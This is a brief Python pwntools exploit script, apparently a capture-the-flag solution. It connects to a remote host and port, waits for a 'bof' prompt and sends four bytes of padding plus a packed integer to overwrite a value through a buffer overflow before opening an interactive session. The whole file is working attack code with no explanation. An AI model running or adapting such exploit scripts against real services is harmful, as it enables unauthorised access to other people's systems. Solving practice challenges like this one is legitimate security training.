from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
#io=process(p)
io=remote("111.198.29.45",45154)
io.recvuntil("bof")
payload='a'*4+p64(1853186401)
io.sendline(payload)

io.interactive()
